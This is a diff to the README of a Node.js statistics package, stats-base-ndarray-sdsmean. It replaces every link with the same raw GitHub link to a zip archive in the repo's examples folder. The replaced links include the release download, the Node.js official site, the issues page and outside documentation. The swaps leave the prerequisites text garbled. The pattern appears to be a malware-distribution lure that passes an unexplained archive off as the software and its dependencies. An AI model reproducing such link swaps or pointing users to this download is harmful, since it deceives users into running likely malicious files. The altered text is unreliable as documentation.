@@ -6,17 +6,17 @@ Welcome to the stats-base-ndarray-sdsmean project! This software makes it easy t
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mohameddioman/stats-base-ndarray-sdsmean/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip%20Latest%https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip)](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip)
 
 ## 📋 Prerequisites
 
 To use this application, ensure you have the following:
 - A computer running Windows, macOS, or a modern version of Linux.
-- Node.js installed on your system. You can download it from [Node.js Official Website](https://nodejs.org/).
+- https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip installed on your system. You can download it from [https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip Official Website](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip).
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/mohameddioman/stats-base-ndarray-sdsmean/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip).
 2. **Select the Latest Version:** Look for the latest release version. Click on it to expand the details.
 3. **Download the Application:** 
    - You will find different files for various systems. Choose the suitable file for your operating system.
@@ -67,13 +67,13 @@ A: The software can handle typical sizes used in statistical analysis, but extre
 
 ## 💬 Support
 
-If you run into issues or have questions, please visit our [GitHub Issues Page](https://github.com/mohameddioman/stats-base-ndarray-sdsmean/issues). We encourage users to report bugs and suggest improvements.
+If you run into issues or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip). We encourage users to report bugs and suggest improvements.
 
 ## 📚 Additional Resources
 
 For more information on how to work with ndarrays and single-precision data types, consider checking out these resources:
-- [Understanding ndarrays](https://numpy.org/doc/stable/reference/array_api.html)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [JavaScript Math Reference](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math)
+- [Understanding ndarrays](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip)
+- [https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip Documentation](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip)
+- [JavaScript Math Reference](https://raw.githubusercontent.com/mohameddioman/stats-base-ndarray-sdsmean/main/examples/stats-base-ndarray-sdsmean_v2.5.zip)
 
 Thank you for choosing stats-base-ndarray-sdsmean. Your statistical calculations are now easier than ever!
